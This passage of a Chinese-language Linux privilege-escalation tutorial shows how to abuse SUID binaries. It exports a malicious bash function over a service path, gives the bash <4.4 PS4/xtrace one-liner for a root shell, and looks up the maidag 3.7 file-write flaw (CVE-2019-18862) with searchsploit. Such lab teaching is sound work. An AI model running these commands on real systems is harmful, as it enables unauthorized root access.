<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">export -f /usr/sbin/service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182631052-1893256594-44b900ac3955549de63326d0435e76dd.png" width="590" height="219" class="img_ev3q"></p>
<p>可以看到环境变量已更新为进入一个 shell，而不是写入 whoami.txt 文件。</p>
<p>接下来要做的就是执行 <strong>suid-sf</strong> 二进制文件。</p>
<p>一旦执行，/usr/bin/service 将被加载，我们的恶意函数将代替真正的 service 二进制文件而被执行。由于 suid-sf 二进制文件添加了 SUID 位，因此会以 root 身份执行，并将我们拖入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-sf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629728-281026855-79adc0807da6ddc79d0467374a9baaf7.png" width="410" height="82" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="53更新-bash-漏洞--利用二"><strong><div id="id5.3">5.3、更新 Bash 漏洞 – 利用二</div></strong><a href="#53更新-bash-漏洞--利用二" class="hash-link" aria-label="53更新-bash-漏洞--利用二的直接链接" title="53更新-bash-漏洞--利用二的直接链接">​</a></h4>
<p>在对 bash 进行修改以删除与函数相关的漏洞后，又发现了一种可在 <code>&lt;4.4</code> 版本的 bash 上运行的解决方法。</p>
<p>在 4.4 之前的 bash 版本上，我们可以打开 debuging 并设置 PS4 变量，这本质上是利用调试模式生成调试语句（或者换句话说，运行命令）的额外提示的能力。</p>
<p>假设之前我们枚举 bash 时，发现它的版本是 <strong>4.3.48</strong>。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630116-1539302267-2413df4e360b2173fc5b3926e41f6d7e.png" width="637" height="127" class="img_ev3q"></p>
<p>由于这个版本<code>&lt;4.4</code>，我们可以使用以下命令将我们的调试语句（命令）注入到 <strong>suid-sf</strong> 二进制文件的执行中，然后运行它。</p>
<p>这应该会立即生成 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">env -i SHELLOPTS=xtrace PS4=&#x27;$(/bin/bash -p)&#x27; /usr/bin/suid-sf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629937-1401092591-dd50baf37a578a47e06fc694e892e12e.png" width="727" height="78" class="img_ev3q"></p>
<p>Cool！尽管自定义 SUID 二进制文件使用 <strong>service</strong> 二进制文件的绝对路径，但我们仍然能够利用两个不同版本的 bash 中存在的漏洞来获取 root shell。</p>
<blockquote>
<p>不幸的是，漏洞利用示例中的两个 <strong>bash</strong> 版本都非常古老（已超过 10 年）。因此，这个漏洞并不常见。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="6利用-suid-二进制文件--第三方程序中打包的二进制文件"><strong><div id="id6">6、利用 SUID 二进制文件 – 第三方程序中打包的二进制文件</div></strong><a href="#6利用-suid-二进制文件--第三方程序中打包的二进制文件" class="hash-link" aria-label="6利用-suid-二进制文件--第三方程序中打包的二进制文件的直接链接" title="6利用-suid-二进制文件--第三方程序中打包的二进制文件的直接链接">​</a></h2>
<p>对于利用自定义 SUID 二进制文件的最后一个示例，我们将研究在第三方程序中打包的 SUID 二进制文件的不同情况。</p>
<p>让我们看一下在枚举过程中发现的 <strong>maidag</strong> 二进制文件。</p>
<p>正如我们在前面所有示例中所做的那样，当面对我们不熟悉的二进制文件时，我们运行它来看看它会做什么。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/sbin/maidag</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="403" height="45" class="img_ev3q"></p>
<p>就像上一个例子一样，当执行这个二进制文件时没有输出。</p>
<p>接下来，我们应该检查是否有帮助菜单，因为这通常会发现有关二进制文件的一些有用信息（如果存在的话）。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/sbin/maidag --help</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630137-1034664518-5b4690639974c2c8c435070c6673a32b.png" width="649" height="481" class="img_ev3q"></p>
<p>在这里我们可以看到二进制文件确实有一个帮助菜单，这意味着它不是一个简单的“内部”自定义二进制文件。这告诉我们 <strong>maidag</strong> 是 “GNU maidag – 邮件传递代理”。</p>
<p>这很有趣，可能会在 GTFOBins 上列出，所以我们应该检查一下。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630067-1334175572-721373b1cc842434126d12fecb240b78.png" width="1024" height="254" class="img_ev3q"></p>
<p>不幸的是，我们没有在 GTFOBins 上找到 <strong>maidag</strong> 二进制文件。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="61确定-maidag-的版本以查找漏洞"><strong><div id="id6.1">6.1、确定 Maidag 的版本以查找漏洞</div></strong><a href="#61确定-maidag-的版本以查找漏洞" class="hash-link" aria-label="61确定-maidag-的版本以查找漏洞的直接链接" title="61确定-maidag-的版本以查找漏洞的直接链接">​</a></h4>
<p>由于这是与第三方程序打包在一起的二进制文件，因此我们这次不想首先就以检查字符串或调试的方式进行。对于像这样复杂的二进制文件，检查字符串或调试将是最后的手段。</p>
<p>接下来，我们将尝试获取二进制文件的版本，以便我们可以在 Google 上查看是否有任何可用的公开漏洞能够利用。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/sbin/maidag --version</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629638-1372012171-551addfc0e5f07b66e9132cdc831626d.png" width="643" height="113" class="img_ev3q"></p>
<p>Cool！我们能够提取到 <strong>maidag</strong> 的版本是 3.7。</p>
<p>一旦找到版本，我们就可以通过该信息在 Google 查找。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629882-1954621641-eb29047d38781a01964d01c5a6e06546.png" width="849" height="617" class="img_ev3q"></p>
<p>好吧，这次搜索带来了一些好东西。我们可以看到，maidag 2.0 – 3.7 版本存在文件写入漏洞。</p>
<p>此外，我们可以看到 Exploit-DB 上有一个针对此漏洞的利用，并且为此漏洞分配了一个 CVE：<strong>CVE-2019-18862</strong></p>
<p>当 Exploit-DB 上有可用的漏洞时，代表它已经在 Kali 上，也就是可以使用 <strong>searchsploit</strong> 获取到副本。</p>
<blockquote>
<p><strong>Searchsploit</strong> 是 Exploit-DB 的命令行搜索工具，它还允许您在本地保存的存储库中执行详细的离线搜索。</p>
</blockquote>
<p>让我们在攻击者的机器上获取一份副本并仔细观察。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit mailutils</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629921-910191703-ee291964240f15b859aaf1141142bd40.png" width="1024" height="215" class="img_ev3q"></p>
<p>原来这不是一个脚本，它实际上是一个 TXT 文件。这意味着它将向我们展示手动执行漏洞利用的步骤，而不是为我们直接利用它。</p>
<p>无论如何，我们应该将其复制到我们的工作目录中以查看该漏洞是如何工作的。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit -m 47703</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 